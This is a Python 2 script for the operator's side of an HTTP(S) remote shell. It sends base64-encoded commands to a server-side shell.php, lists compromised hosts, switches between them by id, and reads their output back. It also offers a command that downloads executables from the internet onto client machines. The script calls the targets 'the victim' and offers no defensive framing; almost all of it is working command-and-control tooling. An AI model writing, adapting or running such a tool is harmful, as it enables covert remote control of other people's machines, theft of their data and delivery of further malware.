#!/opt/local/bin/python

import socket,subprocess,time,urllib2,urllib,sys,base64,os,re,readline

print "\r\n\033[1;34m Python HTTP[S] Shell \033[1;m"
if len(sys.argv) < 3:
    print ('Usage: ' + sys.argv[0] + ' "server_URL" "secret_key"')
    print('e.g: ' + sys.argv[0] + ' http://some.url/shell/ qwe123\n')
    sys.exit(1)


hostname = socket.gethostname() 
server = sys.argv[1]
server_id =  ""
sleep = 10
key = sys.argv[2]


COMMANDS = ['sleep', 'download', 'kill server', 'activate',
            'deactivate', 'list', 'id=', 'exit', 'help']

def complete(text, state):
    
    for cmd in COMMANDS:
        if cmd.startswith(text):
            if not state:
                return cmd
            else:
                state -= 1

def help():
	print "\r\nCommand List:"
	print "=============\n"
	print "kill server - Terminates server on client machine"
	print "sleep - Go to sleep (in seconds) e.g: sleep 60"
	print "download - Download file from the internet to the client machine, e.g: download http://example.com/test.exe"
	print "activate - Default server sleep time (10 sec)"
	print "deactivate - Server 5 minuets sleep for each request"
	print "list - List Clients"
	print "id= - switch to server, e.g: id='server_id'"
	print "exit - quit client\n"


def http_post(cmd):
    
    url = server + "shell.php"
    encoded = base64.b64encode(cmd)
    print encoded
    data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : encoded})
    req = urllib2.Request(url, data)
    response = urllib2.urlopen(req)
    response = response.read()
    print "\r\n\033[1;34m[+] Command sent to server " + server_id + "\033[1;m"
    
    return
    

print "\033[1;33mWelcome " + os.getlogin() + "!\033[1;m\n"
while 1:
	readline.parse_and_bind("tab: complete")
	readline.set_completer(complete)
	cmd = raw_input('\033[1;31m' + hostname + '\033[1;m' + '\033[1;34m~# \033[1;m')
	if cmd == "exit":
		 url = server + "shell.php"
		 data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : ""})
        	 req = urllib2.Request(url, data)
        	 response = urllib2.urlopen(req)
		 print  "\033[1;33m\nGoodbye " + os.getlogin() + "!\033[1;m\n"
		 break
	elif cmd == "":
		pass	
	elif cmd=="help":
		help()
	elif cmd =="list":
		client_list = urllib2.urlopen(server + "list.php").read()
                print "\nAvailable Hosts:\n================ \r\n\n" + client_list.replace('.html<br>','\n') + "\n"
	elif "id=" in cmd:
		server_id =  cmd.split("=")[1]
		print "\n[+] Active connection: " + server_id + '\n'
	elif server_id == "":
		print "\n[!] Please select server id!\n"
	elif cmd =="activate":
		http_post(cmd)
	else:
		cmd_response = urllib2.urlopen(server + "clients/" + server_id + ".html").read()
		data = base64.b64decode(cmd_response)
		if data == "activate":
		    print "\r\n[*] Waiting for server activation, Please wait!\r\n"
		else:
		    url = server + "shell.php"
		    encoded = base64.b64encode(cmd)
		    data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : encoded})
		    req = urllib2.Request(url, data)
		    response = urllib2.urlopen(req)
		    response = response.read()
		    if response == "Key is missing!":
		    	print "\n\033[1;31m[!] Invalid Key!\033[1;m\n"
		    	break

		    print "\r\n\033[1;34m[+] Command " + '"' + cmd + '"' +  " sent to server " + server_id + "\033[1;m"
		    print "\r\033[1;34m[*] Waiting " + str(sleep) + " seconds for a response from the victim...\033[1;m"
		    time.sleep(sleep)
		    cmd_response = urllib2.urlopen(server + "clients/" + server_id + ".html").read()
		    data = base64.b64decode(cmd_response)
		    print "\n" + data #+ "\n"
		    if data == cmd:
		    	print "\n\033[1;33m[!] No response recived from server!\033[1;m\n"
		    url = server + "shell.php"
		    data = urllib.urlencode({'id' : server_id, 'key' : key, 'cmd' : ""})
		    req = urllib2.Request(url, data)
		    response = urllib2.urlopen(req)

